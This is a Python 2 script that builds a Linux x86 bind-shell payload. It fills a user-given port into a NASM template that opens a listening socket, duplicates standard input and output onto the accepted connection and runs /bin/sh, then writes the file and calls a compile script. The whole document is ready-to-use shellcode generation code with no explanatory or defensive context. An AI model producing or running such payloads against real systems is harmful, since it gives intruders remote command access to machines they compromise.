#!/usr/bin/python

import socket, sys
from subprocess import call

if len(sys.argv) != 2:
	print "Fail!"

filename_prefix = "bind-shell"
filename        = filename_prefix + ".nasm"
port_number     = int(sys.argv[1])
port            = socket.htons(port_number)
assembly="""
global _start
section .text
  _start:
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x1

    xor ecx, ecx
    push ecx
    push ebx
    push 0x2

    mov ecx, esp
    int 0x80

    xor edi, edi
    mov edi, eax

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x2

    xor ecx, ecx
    push ecx
    push word 0x%(port)x
    push word bx
    mov ecx, esp

    push 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x4

    xor ecx, ecx
    push ecx
    push edi
    mov ecx, esp
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x5
    xor ecx, ecx
    push ecx
    push ecx
    push edi
    mov ecx, esp
    int 0x80
    xor ebx, ebx
    mov ebx, eax
    xor ecx, ecx
    mov cl, 0x2
  dup2:
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup2
    xor eax, eax
    mov al, 0xb
    xor ebx, ebx
    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
""" % {'port': port}

# Write our template to a file
f = open(filename, 'w')
f.write(assembly)
f.close()

# Compile our file
call(["./compile.sh", filename_prefix])

